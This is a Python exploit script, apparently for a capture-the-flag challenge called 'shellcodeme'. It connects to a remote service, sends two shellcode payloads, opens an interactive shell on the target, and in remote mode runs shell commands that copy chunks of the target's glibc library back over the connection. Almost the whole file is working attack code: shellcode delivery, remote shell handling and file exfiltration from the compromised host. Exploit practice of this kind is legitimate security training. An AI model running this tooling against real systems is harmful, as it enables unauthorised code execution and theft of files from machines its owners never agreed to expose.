#!/usr/bin/env python3

from time import sleep
import socket
import sys
import telnetlib

def _p32(num):
    return num.to_bytes(4, byteorder='little')

def _p64(num):
    return num.to_bytes(8, byteorder='little')

def u32(byte_string):
    byte4 = byte_string.ljust(4, b'\0')
    return int.from_bytes(byte4, byteorder='little')

def u64(byte_string):
    byte8 = byte_string.ljust(8, b'\0')
    return int.from_bytes(byte8, byteorder='little')

def p32(*nums):
    data = b''
    for num in nums:
        data += _p32(num)
    return data

def p64(*nums):
    data = b''
    for num in nums:
        data += _p64(num)
    return data

# This is the modified version of interact() in telnetlib.
# It can receive non-ascii data.
# Original interact() is here:
#     https://github.com/python/cpython/blob/master/Lib/telnetlib.py
def _xinteract(tel):
    import selectors
    with telnetlib._TelnetSelector() as selector:
        selector.register(tel, selectors.EVENT_READ)
        selector.register(sys.stdin, selectors.EVENT_READ)

        while True:
            for key, events in selector.select():
                if key.fileobj is tel:
                    try:
                        text = tel.read_eager()
                    except EOFError:
                        print('*** Connection closed by remote host ***')
                        return
                    if text:
                        string = text.decode('ascii', 'backslashreplace')
                        sys.stdout.write(string)
                        sys.stdout.flush()
                elif key.fileobj is sys.stdin:
                    line = sys.stdin.readline().encode('ascii')
                    if not line:
                        return
                    tel.write(line)

class PwnSocket:
    def __init__(self, ip, port):
        self.silent_flag = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def shell(self):
        tel = telnetlib.Telnet()
        tel.sock = self.sock
        _xinteract(tel)

    def print_bytes(self, byte_str):
        if not self.silent_flag:
            string = byte_str.decode('ascii', 'backslashreplace')
            sys.stdout.write(string)
            sys.stdout.flush()

    def send(self, message):
        self.print_bytes(message)
        self.sock.send(message)

    def send_str(self, string):
        self.send(string.encode('ascii'))

    def send_int(self, num):
        self.send_str(str(num) + '\n')

    def recv_until(self, delimiter_bytes):
        received_data = b''
        while not received_data.endswith(delimiter_bytes):
            tmp = self.sock.recv(1)
            self.print_bytes(tmp)
            received_data += tmp
        return received_data

    def recv(self, num):
        data = self.sock.recv(num)
        self.print_bytes(data)
        return data

    def set_silent(self):
        self.silent_flag = True

    def unset_silent(self):
        self.silent_flag = False

    def download_glibc(self, filename, begin, end):
        self.send_str('echo -n BEGIN; head -c {} /lib/x86_64-linux-gnu/libc.so.6 | tail -c {}; echo -n END; exit\n'.format(begin, end))
        #self.send_str('head -c {} /lib/x86_64-linux-gnu/libc.so.6 | tail -c {}; exit\n'.format(begin, end))
        self.set_silent()
        self.recv_until(b'BEGIN')
        data = self.recv_until(b'END')[:-3]
        #data = self.recv(end)
        with open(filename, 'wb') as f:
            f.write(data)
        self.unset_silent()

    def take_hash(self):
        filepath = '/lib/x86_64-linux-gnu/libc.so.6'
        self.send_str('ls -l ' + filepath + '\n')
        self.recv_until(b'\n')
        self.send_str('md5sum ' + filepath + '\n')
        self.recv_until(b'\n')
        self.send_str('sha1sum ' + filepath + '\n')
        self.recv_until(b'\n')
        self.send_str('sha256sum ' + filepath + '\n')
        self.recv_until(b'\n')

def main(target, filename, begin, end):
    if target == 'remote':
        hostname = 'shellcodeme.420blaze.in'
        ip = socket.gethostbyname(hostname)
        port = 420
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)

    if target == 'debug':
        port = 12345
    elif target == 'no-debug':
        port = 23456

    with open('shellcode', 'rb') as f:
        shellcode = f.read()

    with open('x64shellcode', 'rb') as f:
        shellcode2 = f.read()

    for ch in range(256):
        if ch != 0x0a:
            shellcode2 += ch.to_bytes(1, 'little')
    shellcode2 += b'\n'

    ps = PwnSocket(ip, port)
    ps.set_silent()
    ps.recv_until(b'Shellcode?\n')
    ps.send(shellcode)
    ps.recv_until(b'Shellcode?\n')
    ps.send(shellcode2)

    if target == 'remote':
        ps.download_glibc(filename, begin, end)
    ps.shell()

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '--remote':
        target = 'remote'
    elif len(sys.argv) == 2 and sys.argv[1] == '--no-debug':
        target = 'no-debug'
    else:
        target = 'debug'
    step = 0x10000
    filesize = 1857312
    #for i in range(26,filesize//step):
    for i in range(28, 29):
        main(target, 'glibc'+str(i), step*i, step)
        sleep(5)
    #main(target, 'glibc_last', filesize, filesize%step)
